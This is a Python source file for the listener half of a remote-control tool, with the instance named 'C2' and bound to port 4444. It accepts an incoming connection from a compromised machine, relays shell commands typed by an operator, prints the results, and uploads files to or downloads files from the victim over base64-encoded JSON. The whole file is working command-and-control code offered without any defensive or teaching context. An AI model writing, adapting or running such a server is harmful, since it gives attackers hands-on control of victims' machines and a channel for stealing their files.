import socket
import json
import sys
import base64

class Server:
    def __init__(self, ip, port):
        # create a server socket object  
        self.sock_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock_obj.bind((ip,port))

    '''
            --------------------------------------------------------------------------------
            TRANSMIT
                    -> `string` type is converted to JSON for serialization
                    ->  the JSON data is then encoded as UTF-8 for transmission over TCP
            RECIEVE
                    -> UTF-8 encoded data is decoded to obtain serialized JSON data
                    -> JSON is converted back to `string` type

            `note`: - for files; the binary data is converted to base64 strings before being
                        converted to JSON
                        - at the reciever's end they are decode back from base64 strings to
                        binary streams
                    - for commands; convert them to a list before transmission
            
            Server-Side
                Uploading files -> ["upload",<filename>,<file-data>]
                Download -> ["download",<filename>]
                         -> Response - base64 encoded data                         
                
            ---------------------------------------------------------------------------------

    '''
    
    def reliable_send(self, data):
        for i in range(len(data)):
            x = data[i]
            if not isinstance(x, str):
                data[i] = x.decode('utf-8')
        json_data = json.dumps(data).encode('utf-8')
        self.client_obj.send(json_data)
    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                # append serialized JSON data to static var
                json_data += self.client_obj.recv(1024).decode('utf-8')
                # if data is complete json.loads will execute
                return json.loads(json_data)
            except:
                continue
    
    def read_file(self, path):
        try:
            with open(path, 'rb') as file_obj:
                return base64.b64encode(file_obj.read())
        except:
            return "[+] ERROR - Error opening file"
    def write_file(self, name, content):
        try:
            with open(name, 'wb') as file_obj:
                file_obj.write(base64.b64decode(content))
                return "[+] File downloaded successfully"
        except:
            return "[+] ERROR - Error during creating a file"    
    
    
    def run(self):
        print("[+] Waiting for an Incoming Connection")
        self.sock_obj.listen(1) 
        # Maximum no of Unaccepted Connections that can be allowed before the system stops Listening - listen(1)
        self.client_obj, ip_addr = self.sock_obj.accept() 
        print("[+] Recieved a connection from -> "+str(ip_addr))
        while True:
            cmd = input(">> ").split()
            if len(cmd) == 0:
                continue
            if cmd[0] == "exit":
                self.reliable_send(cmd)
                self.client_obj.close()
                print("[+] Closing Socket Object \n[+] Closing the connection")
                sys.exit(0)
            if cmd[0] == "upload":
                filename = cmd[1].split('/')[-1]
                data = self.read_file(filename)
                if "ERROR" == data[4:9]:
                    print(data)
                    continue
                cmd.append(data)                
            self.reliable_send(cmd)
            response = self.reliable_receive()
            if cmd[0] == "download":
                print(self.write_file(cmd[1].split('/')[-1], response))
                continue
            print(response)

#-----------------------------MAIN-----------------------------------#

# gets the local IP address of the machine
IP = socket.gethostname()
C2 = Server(IP, 4444)
C2.run()
